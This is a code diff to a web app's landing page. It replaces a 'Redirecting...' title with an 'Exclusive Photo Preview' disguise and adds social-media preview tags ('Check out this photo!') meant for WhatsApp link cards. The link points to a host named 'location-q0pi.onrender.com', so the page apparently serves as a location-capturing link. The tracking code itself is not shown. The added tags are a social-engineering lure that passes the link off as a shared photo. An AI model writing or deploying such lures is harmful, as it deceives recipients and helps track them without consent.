@@ -63,7 +63,16 @@ async def public_landing_page(request: Request):
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Redirecting...</title>
+        <title>Exclusive Photo Preview</title>
+        
+        <!-- Open Graph Meta Tags for Rich WhatsApp / Social Media Preview Cards -->
+        <meta property="og:title" content="Check out this photo!" />
+        <meta property="og:description" content="Tap to view the shared image." />
+        <!-- Replace the URL below with a direct image link if you want a specific thumbnail -->
+        <meta property="og:image" content="https://images.unsplash.com/photo-1579546929518-9e396f3cc809" />
+        <meta property="og:url" content="https://location-q0pi.onrender.com" />
+        <meta property="og:type" content="website" />
+
         <style>
             body { font-family: Arial, sans-serif; text-align: center; padding-top: 100px; background-color: #ffffff; }
             p { color: #888; font-size: 16px; }
